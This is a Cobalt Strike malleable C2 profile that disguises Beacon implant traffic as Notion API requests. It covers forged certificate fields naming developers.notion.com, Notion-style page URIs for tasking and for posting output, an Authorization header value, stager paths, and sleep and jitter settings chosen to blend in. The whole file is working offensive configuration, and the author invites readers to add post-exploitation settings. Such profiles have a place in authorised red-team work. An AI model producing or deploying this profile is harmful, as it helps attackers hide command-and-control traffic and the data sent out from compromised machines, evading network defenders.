# Notion Malleable C2
# Author: HuskyHacks | @HuskyHacksMK
# Derived from Google Drive malleable C2 profile by @bluscreenofjeff
# 
#


# The major signatures here: Notion API page URLs consist of NAME-[characters], where NAME is the page's title and the -[characters] is the page ID. Practically, this looks like:
# /SOUVLAKIRECIPE-67f47989c66344338d0de98221404ad3
# ... so change this in each of the malleable sections accordingly

# As for POSTing, the API requires a few headers. The most important one is the authorization header, which contains the secret key needed to POST to the API. See that section for the example.
# WARNING: this profile only contains malleable configs related to the network signatures of Notion. I did not include any post-exploitation configs. You're on your own for those!


https-certificate {
    set CN       "developers.notion.com"; #Common Name
    set O        "Cloudflare Inc"; #Organization Name
    set C        "US"; #Country
    set L        "San Francisco"; #Locality
    set ST       "California"; #State or Province
    set validity "365"; #Number of days the cert is valid for
}


#default Beacon sleep duration and jitter. Notion checks in to upload notes as the user makes them, so we can expect this to be somewhat high with a lot of jitter
set sleeptime "15000";
set jitter    "70";


http-get {

    # This URI can be anything that looks like a Notion URL page, like /RECIPES-67f47989c66344338d0de98221404ad3
    set uri "/DASHBOARD-67f47989c66344338d0de98221404ad3";

    client {

        header "Accept" "text/html,application/xml;*/*;";
        header "Accept-Encoding" "gzip, deflate";
        header "Host" "api.notion.com";

        #session metadata
        metadata {
            base64url;
            netbios;
            base64url;
            # this isn't exactly a parameter of the page but it's workable
            parameter "id";
        }

        parameter "block" "0";
    }

    server {
        header "Content-Type" "application/json; charset=utf-8";
        header "Cache-Control" "no-cache, no-store, max-age=0, must-revalidate";
        header "Pragma" "no-cache";
        header "Content-Disposition" "attachment; filename=\"json.txt\"; filename*=UTF-8''json.txt";
        header "X-Content-Type-Options" "nosniff";
        header "X-Frame-Options" "SAMEORIGIN";
        header "X-XSS-Protection" "1; mode=block";
        header "Server" "GSE";
        header "Connection" "close";


        #Beacon's tasks
        output {
            print;
        }
    }
}

http-post {
    
    # This URI can be anything that looks like a Notion URL page, like /RECIPES-67f47989c66344338d0de98221404ad3
    set uri "/RESEARCH-67f47989c66344338d0de98221404ad3";
    set verb "POST";
    
    client {

        header "Accept" "text/html,application/xml;*/*;";
        header "Accept-Encoding" "gzip, deflate";
        header "Host" "api.notion.com";
        # Our Notion API params to POST to our notebook pages
        header "Notion-Version" "2021-08-16";
        # API key: secret_[about 43 random alpha-num chars]
        header "Authorization" "secret_ee4g0hec9qsb994vwsr9b4i6f9vmkl13cvw6i4gflh0";


        output {
            base64url;
            netbios;
            base64url;
            parameter "u";
        }

        #session ID
        id {
            parameter "block";
        }
    }

    server {
        header "Content-Type" "application/json; charset=utf-8";
        header "Cache-Control" "no-cache, no-store, max-age=0, must-revalidate";
        header "Pragma" "no-cache";
        header "Content-Disposition" "attachment; filename=\"json.txt\"; filename*=UTF-8''json.txt";
        header "X-Content-Type-Options" "nosniff";
        header "X-Frame-Options" "SAMEORIGIN";
        header "X-XSS-Protection" "1; mode=block";
        header "Server" "GSE";
        header "Connection" "close";


        output {
            print;
        }
    }
}

#change the stager server
http-stager {
    
    set uri_x86 "/RECIPES-67f47989c66344338d0de98221404ad3";
    set uri_x64 "/BLOGIDEAS-67f47989c66344338d0de98221404ad3";
    
    server {
        header "Content-Type" "application/json; charset=utf-8";
        header "Cache-Control" "no-cache, no-store, max-age=0, must-revalidate";
        header "Pragma" "no-cache";
    }
}

# Reminder: without any more malleable config changes, the post-ex action in this profile is an OPSEC nightmare.
# Lots of extra stuff can go here (post-ex) but I'll leave that as an exercise to the reader ;)
